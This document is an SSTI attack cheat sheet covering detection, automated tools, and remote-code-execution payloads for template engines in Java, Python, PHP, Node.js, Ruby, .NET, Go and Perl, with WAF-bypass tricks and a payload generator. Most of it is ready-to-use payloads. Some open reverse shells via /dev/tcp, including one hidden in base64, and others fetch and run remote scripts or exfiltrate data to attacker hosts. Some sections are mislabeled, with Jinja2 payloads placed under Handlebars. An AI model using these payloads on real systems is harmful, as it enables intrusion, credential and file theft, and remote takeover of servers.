## Theory & Overview

Server-Side Template Injection (SSTI) is a critical web application vulnerability that occurs when an attacker can inject malicious code into a server-side template engine. Template engines are used in web applications to facilitate interaction between the presentation layer (web pages) and application logic (managed beans), enabling dynamic content generation.

**How SSTI Works:**
- User input is embedded directly into templates without proper sanitization
- The template engine processes this input as part of the template logic
- Attackers can inject template directives to execute unauthorized code
- Can lead to sensitive information disclosure, local file disclosure, and Remote Code Execution (RCE)

**Common Vulnerable Contexts:**
- Direct template rendering with user input
- Template format strings constructed with user data
- Dynamic template generation from user-controlled strings

**Key Technologies Affected:**
- **Java:** JavaServer Faces (JSF), JavaServer Pages (JSP), Spring Framework, Freemarker, Velocity, Thymeleaf
- **Python:** Jinja2, Mako, Tornado
- **PHP:** Smarty, Twig, Plates
- **Ruby:** ERB, Slim
- **Node.js:** Jade/Pug, Handlebars, Nunjucks, JsRender
- **.NET:** Razor, ASP
- **Go:** text/template, html/template
- **Perl:** Mojolicious

---

## Detection & Identification

### Initial Detection Steps

**Step 1: Identify Input Vectors**
Look for parts of the application that accept user content and might be embedded in templates:
- URL parameters
- POST data
- Headers
- Cookies
- File uploads with metadata

**Step 2: Fuzz with Detection Payload**
Use a polyglot payload that tests multiple vulnerabilities simultaneously:

```html
'"<svg/onload=prompt(5);>{{7*7}}
```

This payload tests:
- SQL injection (')
- XSS (<svg/onload=prompt(5);>)
- SSTI ({{7*7}})

**Step 3: Inject Special Characters**
Test with template-specific special characters:

```bash
${{<%[%'"}}%\.
```

**Step 4: Analyze Response Differences**
Compare server responses between:
- Normal data input
- Special character payload
- Template expression payload

**Vulnerability Indicators:**
- Thrown errors revealing template engine
- Payload reflection missing or partially missing
- Mathematical expressions evaluated (e.g., {{7*7}} returns 49)
- Template-specific syntax processed

### Template Engine Identification

**Detection by Mathematical Operations:**

```bash
# Basic detection payloads
{{7*7}}          # Jinja2, Twig = 49
${7*7}           # Mako, FreeMarker = 49
<%= 7*7 %>       # ERB, ASP = 49
#{7*7}           # EL = 49
${{7*7}}         # EL, some Java engines = 49
{{7*'7'}}        # Jinja2, Twig = 7777777
${7*'7'}}        # Mako = Nothing
<%= 7*'7' %>     # ERB = Error
```

**Identification Flowchart Method:**

1. Test `{{7*7}}`:
   - If **49**: Likely Jinja2, Twig, or similar
   - If **{{7*7}}**: Not processed, try other syntax

2. Test `${7*7}`:
   - If **49**: Likely Mako, EL, FreeMarker
   - If **${7*7}**: Not processed

3. Test `<%= 7*7 %>`:
   - If **49**: Likely ERB, ASP
   - If **Error**: Check error message for engine name

4. Test `#{7*7}`:
   - If **49**: Likely EL (legacy)

**Identification Decision Tree:**

```
Start: {{7*7}}
├─ 49 → {{7*'7'}}
│  ├─ 7777777 → Jinja2/Twig
│  └─ 49 → Unknown (further testing)
├─ Error → Check error for engine name
└─ {{7*7}} → Try ${7*7}
   ├─ 49 → ${7*'7'}}
   │  ├─ Nothing → Mako
   │  └─ 49 → FreeMarker/EL
   └─ ${7*7} → Try <%= 7*7 %>
      ├─ 49 → ERB/ASP
      └─ <%= 7*7 %> → Try other syntaxes
```

**Burp Suite Detection Vector:**

```bash
gk6q${"zkz".toString().replace("k", "x")}doap2
# Returns: "igk6qzxzdoap2" indicates expression execution
```

**Blind Detection (Time-based):**

```bash
# Sleep 10 seconds
${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40java.lang.Thread%40sleep(10000)%2c1%3f%23xx%3a%23request.toString}
```

### Automated Detection Tools

**TInjA (Recommended):**
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia" -c "PHPSESSID=ABC123..."
```

**SSTImap:**
```bash
python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/" --crawl 5 --forms
python3 sstimap.py -u "https://example.com/page?name=John" -s
```

**Tplmap:**
```bash
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```

**Fenjing (Fuzzing WAF bypass):**
```bash
python -m fenjing scan --url 'http://xxx/'
python -m fenjing crack --url 'http://xxx/' --method GET --inputs name
python -m fenjing crack-path --url 'http://xxx/hello/'
```

**One-liner Detection with waybackurls:**
```bash
waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt
ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
# Check in Burp for responses containing 'ssti81'
```

---

## Exploitation Methods by Engine

### Java-Based Engines

#### Basic Java Injection

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

#### Java - Environment Variables Retrieval

```java
${T(java.lang.System).getenv()}
```

#### Java - Read /etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

#### FreeMarker (Java)

**Detection:**
```java
${7*7} = 49
#{7*7} = 49 (legacy)
```

**RCE Payloads:**
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

**Sandbox Bypass (< v2.3.30):**
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

#### Velocity (Java)

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

#### Thymeleaf (Java)

**Detection:**
```java
${7*7}
[[${7*7}]]
```

**RCE with SpringEL:**
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```

**RCE with OGNL:**
```java
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

**Expression Preprocessing:**
```java
__${sel.code}__
```

**XSS/RCE in Attributes:**
```xml
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```

#### Spring Framework (Java)

**Multiple Expression Delimiters:**
Try if `${...}` doesn't work: `#{...}`, `*{...}`, `@{...}`, `~{...}`

**RCE:**
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

**Filter Bypass - Read /etc/passwd:**
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

#### Spring View Manipulation (Java)

```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```

#### Pebble (Java)

**Detection:**
```java
{{ someString.toUPPERCASE() }}
```

**Old Version (< 3.0.9):**
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```

**New Version:**
```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

#### Jinjava (Java)

**Detection:**
```java
{{'a'.toUpperCase()}} // Returns: A
{{ request }} // Returns: com.[...].context.TemplateContextRequest@23548206
```

**RCE:**
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

#### HubSpot HuBL (Java)

**Detection:**
```java
{{ request }} // com.hubspot.content.hubl.context.TemplateContextRequest@23548206
{{'a'.toUpperCase()}} // A
{{'a'.concat('b')}} // ab
{{'a'.getClass()}} // java.lang.String
```

**RCE:**
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

#### Expression Language (EL)

**Detection:**
```java
${"aaaa"} // aaaa
${99999+1} // 100000
#{7*7} // 49
${{7*7}} // 49
```

**Context Variables:**
```java
${{request}}
${{session}}
{{faceContext}}
```

**Remote File Inclusion:**
```bash
${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=new%20java.io.FileInputStream(%23wwww),%23qqqq=new%20java.lang.Long(%23wwww.length()),%23tttt=new%20byte[%23qqqq.intValue()],%23llll=%23pppp.read(%23tttt),%23pppp.close(),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(new+java.lang.String(%23tttt))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=%2fetc%2fpasswd
```

**Directory Listing:**
```bash
${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=%23wwww.listFiles(),%23qqqq=@java.util.Arrays@toString(%23pppp),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23qqqq)%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=..
```

**RCE - Linux:**
```bash
${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="%2fbin%2fsh",%23ssss[1]="%2dc",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```

**Additional RCE Payloads:**
```java
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND>).start()

# Using Runtime via getDeclaredConstructors
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

# Using ScriptEngineManager
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
```

#### Groovy (Java)

**Security Manager Bypasses:**
```java
// Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
    cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
    assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

// Payload with output exfiltration
import groovy.*;
@groovy.transform.ASTTest(value={
    cmd = "whoami";
    out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
    cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
    java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

// Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
```

---

### Python-Based Engines

#### Jinja2 (Python)

**Detection:**
```python
{{7*7}} = 49
${7*7} = ${7*7}
{{7*'7'}} = 7777777
{{foobar}} = Nothing
```

**Accessing Global Objects:**
```python
# Always accessible objects
[]
''
()
dict
config
request
```

**Reaching Object Class:**
```python
# Access class object
[].__class__
''.__class__
()["__class__"]
request["__class__"]
config.__class__
dict  # Already a class

# From class to object class
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# Call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
```

**RCE - Read/Write Files:**
```python
# File class (index 40 - may vary)
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/test.txt', 'w').write('Hello!') }}
```

**RCE - Command Execution:**
```python
# subprocess.Popen (index may vary)
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Without guessing index
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("whoami").read()}}{%endif%}{% endfor %}

# Passing command via GET parameter
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}

# Without quotes or underscores
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}
```

**RCE - Not Dependent on __builtins__:**
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Shortest versions
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

**Without Object Class - Using Globals:**
```python
# Via request object
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# Via config object
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}

# Using import_string from config globals
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}
```

**Dump Configuration:**
```python
{{ config }}
{{ config.items() }}
{% for key, value in config.items() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

**Inspecting Environment:**
```python
{{sessionScope.toString()}}
${applicationScope}  # global application variables
${requestScope}      # request variables
${initParam}         # application initialization variables
${sessionScope}      # session variables
${param.X}           # param value
```

**Authorization Bypass:**
```python
${pageContext.request.getSession().setAttribute("admin", true)}
```

#### Mako (Python)

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

#### Tornado (Python)

**Detection:**
```python
{{7*7}} = 49
${7*7} = ${7*7}
{{7*'7'}} = 7777777
```

**RCE:**
```python
{% import os %}
{{os.system('whoami')}}
```

---

### PHP-Based Engines

#### Smarty (PHP)

**Detection:**
```php
{$smarty.version}
```

**RCE:**
```php
{php}echo `id`;{/php}  // deprecated in v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')}  // v3 compatible
{system('cat index.php')}  // v3 compatible
```

#### Twig (PHP)

**Detection:**
```python
{{7*7}} = 49
${7*7} = ${7*7}
{{7*'7'}} = 49
{{1/0}} = Error
{{foobar}} = Nothing
```

**Information Gathering:**
```python
{{_self}}  # Current application reference
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
```

**File Read:**
```python
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
```

**RCE:**
```python
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}
```

**Avoiding HTML Encoding:**
```python
{{'<script>alert(1);</script>'|safe}}
```

**Evil Config File RCE:**
```python
# Write evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# Load evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# Execute command
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```

#### Plates (PHP)

Uses native PHP code in templates:

**Controller:**
```php
$templates = new League\Plates\Engine('/path/to/templates');
echo $templates->render('profile', ['name' => 'Jonathan']);
```

**Template:**
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>
<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```

#### PHPlib / HTML_Template_PHPLIB

**Template File:**
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<!-- BEGIN authorline -->
<tr>
  <td>{AUTHOR_NAME}</td>
  <td>{AUTHOR_EMAIL}</td>
</tr>
<!-- END authorline -->
</table>
</body>
</html>
```

---

### Node.js-Based Engines

#### Jade/Pug (Node.js)

**Detection:**
```javascript
#{7*7} = 49
```

**RCE:**
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')

#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

#### Handlebars (Node.js)

**Detection:**
```java
{{7*7}} = {{7*7}}
${7*7} = ${7*7}
```

**Path Traversal:**
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{"profile":{"layout": "./../routes/index.js"}}' 'http://target.com/'
```

**RCE:**
```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

# Passing cmd via GET parameter
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}

# Without quotes and underscores
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}
```

#### JsRender (Node.js)

**Detection:**
```javascript
{{:7*7}} = 49
```

**Client-Side XSS:**
```javascript
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```

**Server-Side RCE:**
```javascript
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```

#### Nunjucks (Node.js)

**Detection:**
```javascript
{{7*7}} = 49
{{console.log(1)}} = Error
```

**RCE:**
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}

{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```

#### PugJs (Node.js)

**Detection & RCE:**
```javascript
#{7*7} = 49
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}
```

---

### Ruby-Based Engines

#### ERB (Ruby)

**Detection:**
```ruby
{{7*7}} = {{7*7}}
${7*7} = ${7*7}
<%= 7*7 %> = 49
<%= foobar %> = Error
```

**RCE:**
```ruby
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/etc/passwd').read %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines() %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

#### Slim (Ruby)

**Detection & RCE:**
```ruby
{ 7 * 7 }
{ %x|env| }
```

---

### .NET-Based Engines

#### Razor (.NET)

**Detection:**
```csharp
@(2+2)  // Success
@()  // Success
@("{{code}}")  // Success
@  // Success
@{}  // ERROR
@{  // ERROR
```

**RCE:**
```csharp
@(1+2)
@(System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt"))
@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc <base64_payload>")
```

#### ASP

**Detection:**
```asp
<%= 7*7 %> = 49
<%= "foo" %> = foo
<%= foo %> = Nothing
<%= response.write(date()) %> = <Date>
```

**RCE:**
```asp
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```

#### .NET Reflection Bypass

Bypass blacklisting using .NET Reflection:

**Load DLL from filesystem:**
```csharp
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null, "/path/to/System.Diagnostics.Process.dll".Split("?"))}
```

**Load DLL from base64:**
```csharp
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("Load", [typeof(byte[])]).Invoke(null, [Convert.FromBase64String("Base64EncodedDll")])}
```

**Full RCE:**
```csharp
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null, "/path/to/System.Diagnostics.Process.dll".Split("?")).GetType("System.Diagnostics.Process").GetMethods().GetValue(0).Invoke(null, "/bin/bash,-c ""whoami""".Split(","))}
```

---

### Go-Based Engines

#### Go Templates

**Detection:**
```go
{{ . }}  // Reveals data structure
{{printf "%s" "ssti"}}  // Returns: ssti
{{html "ssti"}}  // Returns: ssti
{{js "ssti"}}  // Returns: ssti
[[${7*7}]]  // Expression inlining
```

**XSS with text/template:**
Direct payload insertion works. With html/template, use template definition:

```go
{{define "T1"}}alert(1){{end}} {{template "T1"}}
```

**RCE (text/template):**
```go
{{ .System "ls" }}  // If object has System method
```

**Expression Preprocessing:**
```go
#{selection.__${sel.code}__}
```

**URL Examples:**
```
http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```

---

### Perl-Based Engines

#### Mojolicious (Perl)

Uses ERB-like syntax:

**Detection & RCE:**
```perl
<%= 7*7 %> = 49
<%= foobar %> = Error

<%= perl code %>
<% perl code %>
```

---

## Filter Bypasses & WAF Evasion

### Common Bypass Techniques

#### Bypass Dot (`.`) Character

Use bracket notation:
```python
# Python/Jinja2
request.__class__ == request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join)
```

#### Bypass Underscore (`_`) and Special Characters

**Hexadecimal Encoding:**
```python
# \x5f = _
{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}

# Full hex encoding
{{ request['\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('\x69\x64')['\x72\x65\x61\x64']() }}
```

**Using Request Object:**
```python
# Via header
request|attr(request.headers.c)  # Send header: "c: __class__"

# Via GET parameter
request|attr(request.args.c)  # Send param: ?c=__class__
request|attr(request.query_string[2:16].decode())

# Join list from params
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)

# Format string from params
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

#### Bypass Brackets (`[` `]`)

**Using getlist:**
```python
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

#### Using `with` Statement

```python
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
```

#### Without Multiple Special Characters

**Jinja2 without `{{`, `.`, `[`, `]`, `}}`, `_`:**
```python
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
```

#### Avoiding HTML Encoding

Use the `safe` filter:
```python
{{'<script>alert(1);</script>'|safe}}
```

### Character Encoding & Obfuscation

**String Construction:**
```python
# Character-by-character construction
T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97))...

# Hex encoding
\x5f\x5f = __
\x61\x70\x70 = app
```

**Custom Generator Script (Python):**
```python
#!/usr/bin/python3
from sys import argv

cmd = list(argv[1].strip())
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
    if count == 1:
        base_payload += f"(T(java.lang.Character).toString({i}).concat"
        count += 1
    elif count == len(converted):
        base_payload += f"(T(java.lang.Character).toString({i})))"
    else:
        base_payload += f"(T(java.lang.Character).toString({i})).concat"
        count += 1

print(base_payload + end_payload)
```

